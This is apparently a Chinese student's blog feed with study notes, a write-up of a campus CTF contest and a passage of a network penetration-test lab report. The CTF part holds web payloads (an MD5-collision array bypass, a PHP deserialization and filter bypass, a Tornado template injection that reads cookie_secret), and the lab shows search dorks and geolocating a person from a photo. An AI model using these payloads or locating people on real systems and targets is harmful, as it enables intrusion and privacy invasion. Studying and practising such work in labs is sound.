align="center"><code>.string</code></td><td align="center">待匹配的文本</td></tr><tr><td align="center"><code>.re</code></td><td align="center">匹配时使用的pattern对象（正则表达式）</td></tr><tr><td align="center"><code>.pos</code></td><td align="center">正则表达式搜索文本的开始位置</td></tr><tr><td align="center"><code>.endpos</code></td><td align="center">正则表达式搜索文本的结束位置</td></tr></tbody></table><ul><li>match 对象的方法</li></ul><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>.group(0)</code></td><td align="center">获得匹配后的字符串</td></tr><tr><td align="center"><code>.start()</code></td><td align="center">匹配字符串在原始字符串的开始位置</td></tr><tr><td align="center"><code>.end()</code></td><td align="center">匹配字符串在原始字符串的结束位置</td></tr><tr><td align="center"><code>.span()</code></td><td align="center">返回(.strat(),.end())</td></tr></tbody></table><h3 id="re-库中贪婪匹配和最小匹配"><a href="#re-库中贪婪匹配和最小匹配" class="headerlink" title="re 库中贪婪匹配和最小匹配"></a>re 库中贪婪匹配和最小匹配</h3><ul><li>re 库默认采用贪婪匹配，匹配最长的子串</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span> = re.search(<span class="string">r&#x27;PY.*N&#x27;</span>, <span class="string">&#x27;PYANBNCNDN&#x27;</span>) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;PYANBNCNDN&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>通过在操作符后添加 ? 可变成最小匹配</li></ul><table><thead><tr><th align="center">操作符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>*?</code></td><td align="center">前一个字符0次或无限次扩展，最小匹配</td></tr><tr><td align="center"><code>+?</code></td><td align="center">前一个字符1次或无限次扩展，最小匹配</td></tr><tr><td align="center"><code>??</code></td><td align="center">前一个字符0次或1次扩展，最小匹配</td></tr><tr><td align="center"><code>&#123;m,n&#125;?</code></td><td align="center">扩展前一个字符m至n次（含n），最小匹配</td></tr></tbody></table><h1 id="网络爬虫之框架"><a href="#网络爬虫之框架" class="headerlink" title="网络爬虫之框架"></a>网络爬虫之框架</h1><h2 id="Scrapy爬虫框架"><a href="#Scrapy爬虫框架" class="headerlink" title="Scrapy爬虫框架"></a>Scrapy爬虫框架</h2><ul><li>安装</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><ul><li>框架结构（直接上图，思路很清晰）</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210119180025.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数电速通笔记</title>
      <link href="/posts/4763/"/>
      <url>/posts/4763/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>这个纸质版的笔记肯定是要在考前撕掉祭天的，但是有点舍不得，搞篇博客记录下来，<del>万一重修了呢</del>（60分飘过，感谢老师）</p></blockquote><p><img src="https://ftp.bmp.ovh/imgs/2020/11/f39affa3ecb54f36.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/e7abd6a28b653db0.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/062b6f30a2efb813.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/5743ad70738cb405.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/215f4def5cc2d9d5.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/dbcf2c3a23eb3ed8.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/4ec469397cc63880.jpg"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/11/a964465104fff4e0.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/D097B9ED0D27691E83822263713B3C66.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/3ABB3BAF384C2A0FCE73F9CFC4DCB4EB.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/A9FC6073550E88485B7A91C2A771C019.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/61FEC196297E9A085E015DDEF836334A.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/95DC7AF1D9C5818DAAA35F29CDC89319.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字电路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020西大线下赛总结</title>
      <link href="/posts/57329/"/>
      <url>/posts/57329/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>这是第一次打线下 AWD 的 CTF 比赛，但是感觉赛制不够正宗，居然是解题和打靶机两个模块分开来的，之前一直以为是把题目放到靶机上</p></blockquote><p>这次比赛我的队伍没有取得很好的名次，我觉得原因还是在我，第一是硬实力不够强，第二是心态不够沉稳，第三是忽略了团队的作用</p><p>复现 Web 题</p><h2 id="1、hash"><a href="#1、hash" class="headerlink" title="1、hash"></a>1、hash</h2><p>右键查看源码发现 waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;*********************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;密码不能与账户相同&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])==<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))===<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;账户与密码md5值不相等&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;账户与密码sha1值不相等 :(&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很常规的题型了</p><p>sha1函数用数组绕过，当传入的是数组时，sha1函数解析错误返回 False 完成 if 条件比较username[]&#x3D;xxx,password[]&#x3D;xxx</p><p>md5 函数强比较是 md5 值碰撞绕过，如果是常规强比较可以用数组绕过，传进去两个数组，数组的值不相等，造成 md5 加密时报错产生 NULL&#x3D;NULL 的情况，绕过比较，但是<strong>implode函数是把数组元素组合为字符串</strong>，不能用数组绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username[]=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;</span><br><span class="line">password[]=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201024221100.png" alt="flag"></p><h2 id="2、dHd"><a href="#2、dHd" class="headerlink" title="2、dHd"></a>2、dHd</h2><blockquote><p>这题就是让我比赛没有取得更好成绩的原因</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = @<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&#x27;r&#x27;</span>));</span><br><span class="line"><span class="variable">$gogogo</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">str_ireplace</span>([<span class="string">&#x27;fl@g&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>],<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;file));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常规得不能再常规的一道反序列化题，20 分钟审完代码</p><blockquote><p><code>file_get_contents() </code>：把整个文件读入一个字符串中，</p></blockquote><blockquote><p><code>str_ireplace() </code>:替换字符串中的一些字符，例如：<code>str_ireplace(&quot;WORLD&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);</code>把字符串 “Hello world!” 中的字符 “WORLD”（不区分大小写）替换成 “Peter”：</p></blockquote><p>GET方式 传进去一个 $file ，<code>file_get_contents</code>函数把文件读取成字符串，所以 $file 应该是一个文件，结合题目和后面的过滤，猜测是<code>fl@g.php</code>，<code>base64_decode</code>解密，把字符串反序列化</p><p>进入 class 类，反序列化的时候<code>__wakeup()</code>魔术方法会自动运行，会把 $file 的名字改为 <code>index.php</code>，所以这题第一个考点就是绕过<code>__wakeup()</code>函数，方法很简单，这个函数有它自己的漏洞，第二个考点在对象实例化后销毁的时候，会自动调用类里面的<code>__destruct</code>函数，过滤掉<code>fl@g</code>字段，绕过这个函数的方法也很简单，双写绕过，<code>flfl@g@g.php</code>，str_ireplace函数把<code>fl@g</code>替换成空后留下来的还是<code>fl@g.php</code></p><p>最后需要用 <code>php://input</code>伪协议</p><blockquote><p>对于<code>php://input</code>介绍</p><p>PHP官方手册文档有一段话对它进行了很明确地概述。<br>&#x3D;&#x3D;“php:&#x2F;&#x2F;input allows you  to read raw POST data. It is a less memory intensive alternative  to$HTTP_RAW_POST_DATA and does not need any special php.ini directives.  php:&#x2F;&#x2F;input is not available with enctype&#x3D;”multipart&#x2F;form-data”.&#x3D;&#x3D;</p><p>翻译过来，是这样：<br>&#x3D;&#x3D;“php:&#x2F;&#x2F;input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特殊的php.ini设置。php:&#x2F;&#x2F;input不能用于enctype&#x3D;multipart&#x2F;form-data”&#x3D;&#x3D;</p><blockquote><p>这里是自己的理解</p><p><code>file_get_contents</code>函数本质上是得到一个文件路径然后去访问一个地址，然后取出其中的内容返回成一个字符串，而 <code>php://input</code>伪协议访问文件的只读流能够定位到 POST 表单，同样也是返回一个地址，所以能够让<code>file_get_contents</code>直接读到 POST 表单的数据当成返回值</p></blockquote></blockquote><h2 id="3、inj"><a href="#3、inj" class="headerlink" title="3、inj"></a>3、inj</h2><p>刚开始进来看到题目，信息还是挺多的</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201016234902.png" alt="初见"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line">file?filename=/flag.txt&amp;filehash=949e1b3d04ef60ff02ffc6f6bb34fdae</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line">file?filename=/welcome.txt&amp;filehash=f123ac29baec2ab4ba71527c69fb5e27</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line">file?filename=/hints.txt&amp;filehash=25e57d65d8b56f0088974e199fafd121</span><br></pre></td></tr></table></figure><p>依次点开发现得到以下内容，通过观察发现<code>file?filename=/文件名&amp;文件的md5值</code>，其中 hints.txt 里面提示<code>md5(cookie_secret+md5(filename))</code>，welcome.txt 里面提示一个<code>render</code>是渲染的意思，flag.txt 里面是通知一声 flag 在<code>fllllllllllllag</code>里面，这个题的题目里<code>tornado</code>是 Python 的一个模板</p><p>当有文件名或文件md5值不匹配时，将会跳转到 Error 页面</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201016235931.png" alt="Error"></p><blockquote><p>这题是SSTI服务器模板注入</p></blockquote><p>因此，通过<code>handler.application</code>即可访问整个tornado。简单而言通过<code>&#123;&#123;handler.application.settings&#125;&#125;</code>或者<code>&#123;&#123;handler.settings&#125;&#125;</code>就可获得<code>settings</code>中的**<code>cookie_secret</code>**</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201016234807.png" alt="cookie_secert"></p><p>找个 md5 加密网站搞一搞就出来了</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201017003214.png" alt="flag"></p><h1 id="流水账"><a href="#流水账" class="headerlink" title="流水账"></a>流水账</h1><h2 id="10-23"><a href="#10-23" class="headerlink" title="10.23"></a>10.23</h2><p>23号没啥好说的，在学校打车去火车站半天打不到，差点急死人，十二点的车，到南宁后坐地铁，然后走路到酒店以及天黑了，然后姚老师请大家吃了饭，真好</p><p>吃完饭偷偷拿了比赛牌去找了在西大的高中同桌玩</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027201147.png"></p><p>俩人逛了西大好大一圈，我发现桂电和西大都挺大的，但是就是感觉桂电小小气气的，后来和队友总结了一下，发现西大的建筑、楼，普遍高大宏伟有排面，桂电的楼吧，我姑且说是咱学校低调吧</p><p><img src="https://s1.ax1x.com/2020/10/27/BlEp6A.jpg" alt="西大有排面的楼"></p><p>西大自产自销的牛奶特别好喝，就是感觉一瓶有点少，几口就闷没了，但是真的特别好喝</p><p>好兄弟还带我去逛了他在的那个学院，参观的时候发生了好玩的事情，在《包装设计师必读手册》旁边有一杯喝完的益禾堂，这一版墙都是展示荣耀、奖状和出版作品的，我差点以为这个益禾堂的包装也是个荣誉作品，出自西大之手</p><p><img src="https://s1.ax1x.com/2020/10/27/BlA6Lq.jpg" alt="注意细节"></p><p>逛的差不多了，跟好兄弟交代了一点事之后就回到酒店呼呼大睡了</p><h2 id="10-24"><a href="#10-24" class="headerlink" title="10.24"></a>10.24</h2><p>比赛的日子，我这个学期第一次早上六点半起床，真不错，早起真不错</p><p>大家收拾好集合了以后就跑去西大吃早点了，就普普通通吃了一碗桂林米粉，虽然味道不错但还是没有桂林的感觉，学长说是酸笋不够臭</p><p>接下来就到了比赛的现场，荟萃楼7楼，这楼是真的漂亮，礼仪小姐姐估计是西大的礼仪队的，也很漂亮</p><p><img src="https://s1.ax1x.com/2020/10/27/BlE2jA.jpg" alt="丢人现场"></p><p>说到比赛场地，我真的对比赛坐的那个椅子非常满意，虽然其貌不扬，但是真的特别特别舒服，后背靠的那个地方是可以调节的，做很久了腰和脖子都不会很累</p><p><img src="https://s1.ax1x.com/2020/10/27/BlVUPS.jpg" alt="很舒服的椅子"></p><p>比赛内容分成了两个模块，一个是 ctf 常规解题，另一边是打靶机，但是每个队基本上都在做题，一个上午过去了，大家都说这靶机是虚空靶机，找都找不到在哪，只能吃吃彩蛋和线索的烂分，说到题，比赛居然没有 pwn 题，搞得 pwn 师傅十分不满意，差点当场退役，只能打打逆向玩一玩</p><p>打到中午，西大给大家准备了盒饭，就很常规的食堂饭，还行，跟桂电的差不了多少，吃完饭就继续打比赛了</p><p>打完比赛以后，姚老师带我们和以前毕业的学长一起吃了个饭，然后学长给我们说了好多好多话，虽然可能是喝多了，但是说的话无非绕不开<code>努力</code>、<code>带学弟</code>和<code>传承</code>三个关键字，信息安全发展至今毕竟还是小圈子，之所以有那么多内推的名额，最大的原因还是传承，每个学校都有信息安全的社团，社团内的一脉相传，不管是技术上还是精神上，都是一种传承，在良好的氛围下，还需要每个人都不断的努力，从早到晚，从周一到周日，从学期开始到学期结束，从大一到大四……所以以后得更加努力，努力提升自己</p><p>吃完饭回到酒店洗了个澡，跟舍友去逛了逛周边的夜市散了散步，买了杯果茶就散步回到酒店继续呼呼大睡了</p><h2 id="10-25"><a href="#10-25" class="headerlink" title="10.25"></a>10.25</h2><p>归家的日子，睡不惯酒店的被子，导致我因为踢被子早上五六点就醒了，再一觉醒来九点半，觉得来南宁没有吃个老友粉还是对不起这张车票的，然后一起去吃了个老友粉，味道还行，下次来找朋友推荐几家正宗的去试一试</p><p><img src="https://s1.ax1x.com/2020/10/27/Blnaoq.jpg" alt="老友粉"></p><p>坐地铁去火车站，回桂电，洗衣服，睡一觉，起来干活(补作业)</p><p>这天最倒霉的就是到了桂林北站，学长说搞个共享汽车开回去，结果共享汽车刚开出停车位没几步就没电打不起火了，然后又滴滴打车回到了学校，还比自己开车便宜</p>]]></content>
      
      
      <categories>
          
          <category> 生活杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试实验合集</title>
      <link href="/posts/60018/"/>
      <url>/posts/60018/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透测试实验一：网络扫描与网络侦察"><a href="#网络渗透测试实验一：网络扫描与网络侦察" class="headerlink" title="网络渗透测试实验一：网络扫描与网络侦察"></a>网络渗透测试实验一：网络扫描与网络侦察</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。</li></ul><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><ul><li>Kali Linux 2、Windows</li></ul><h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><ul><li>交换网络结构</li></ul><h2 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h2><ul><li>Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali自带）；WinHex、数据恢复软件等</li></ul><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1-用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面"><a href="#1-用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面" class="headerlink" title="1. 用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面"></a>1. 用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026200649.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&quot;network security&quot; filetype:pdf site:www.mit.edu/</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026201030.png"></p><blockquote><p>搜索内容+ “2019”</p><p><code>+</code>号表示同时满足这个加号后面的关键词</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026193716.png" alt="+ &quot;&quot;"></p><h3 id="2-照片中的女生在哪里旅行？截图搜索到的地址信息"><a href="#2-照片中的女生在哪里旅行？截图搜索到的地址信息" class="headerlink" title="2. 照片中的女生在哪里旅行？截图搜索到的地址信息"></a>2. 照片中的女生在哪里旅行？截图搜索到的地址信息</h3><blockquote><p>老社工了</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026201318.jpg" alt="图片"></p><blockquote><p>谷歌地图关键字：Cafe-Brasserie-LeTrentehuit</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026205946.jpg"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026210123.png"></p><h3 id="3-手机位置定位。通过LAC（Location-Area-Code，位置区域码）和CID（Cell-Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置"><a href="#3-手机位置定位。通过LAC（Location-Area-Code，位置区域码）和CID（Cell-Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置" class="headerlink" title="3. 手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置"></a>3. 手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置</h3><ul><li><p>获取自己手机的LAC和CID：</p><p>Android 获取方法：Android： 拨号*#*#4636#*#*进入手机信息工程模式后查看</p><p>iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest</p><p>Serving Cell info–&gt;LAC&#x3D;Tracking Area Code –&gt;cellid &#x3D; Cell identity</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026211506.png"></p></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026211423.png"></p><h3 id="4-编码解码"><a href="#4-编码解码" class="headerlink" title="4. 编码解码"></a>4. 编码解码</h3><ul><li>将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026213526.png"></p><h3 id="5-地址信息"><a href="#5-地址信息" class="headerlink" title="5. 地址信息"></a>5. 地址信息</h3><h4 id="5-1-内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"><a href="#5-1-内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。" class="headerlink" title="5.1 内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"></a>5.1 内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。</h4><blockquote><p> 猜都能猜到是姚老师拿自己的手机访问桂电……</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026215914.png" alt="MAC"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026220031.png"></p><h4 id="5-2-访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。"><a href="#5-2-访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。" class="headerlink" title="5.2 访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。"></a>5.2 访问<a href="https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。">https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。</a></h4><blockquote><p>公网 ip 打码了，怕被搞</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106002812.png" alt="MyIP"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201026220321.png" alt="ipconifg"></p><blockquote><p>不相同，因为网站查询到的是公网IP，ipconfig查询到的是内网IP</p></blockquote><h3 id="6-NMAP的使用"><a href="#6-NMAP的使用" class="headerlink" title="6. NMAP的使用"></a>6. NMAP的使用</h3><h4 id="6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。"><a href="#6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。" class="headerlink" title="6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。"></a>6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027000326.png" alt="扫描端口"></p><h5 id="21端口ftp文件传输协议"><a href="#21端口ftp文件传输协议" class="headerlink" title="21端口ftp文件传输协议"></a>21端口ftp文件传输协议</h5><p>该协议是Internet文件传送的基础，它由一系列规格说明文档组成，目标是提高文件的共享性，提供非直接使用远程计算机，使存储介质对用户透明和可靠高效地传送数据。<br> 功能：<br> 服务器的上传  和下载，Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。用户可以通过它把自己的PC机与世界各地所有运行FTP协议的服务器相连，访问服务器上的大量程序和信息。实现各种操作系统之间的文件交流，建立一个统一的文件传输协议。<br> FTP的传输有两种方式：ASCII传输模式和二进制数据传输模式</p><h5 id="22端口ssh服务"><a href="#22端口ssh服务" class="headerlink" title="22端口ssh服务"></a>22端口ssh服务</h5><p>在进行数据传输之前，SSH先对联机数据包通过加密技术进行加密处理，加密后在进行数据传输。确保了传递的数据安全。SSH是专为远程登录会话和其他网络服务提供的安全性协议。利用 SSH 